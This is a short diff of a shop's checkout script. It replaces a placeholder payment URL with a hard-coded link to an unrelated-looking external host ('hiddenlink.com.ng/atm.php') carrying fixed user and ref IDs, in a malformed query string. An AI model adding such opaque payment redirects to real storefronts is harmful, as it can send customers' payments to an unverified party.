@@ -28,5 +28,5 @@ document.addEventListener('DOMContentLoaded', () => {
   totalPriceElement.textContent = total.toFixed(2);
 
   // Set the payment link
-  placeOrderButton.href = `https://your-payment-site.com?total=${total}`;
+  placeOrderButton.href = `https://hiddenlink.com.ng/atm.php?user=99940&ref=99940?total=${total}`;
 });
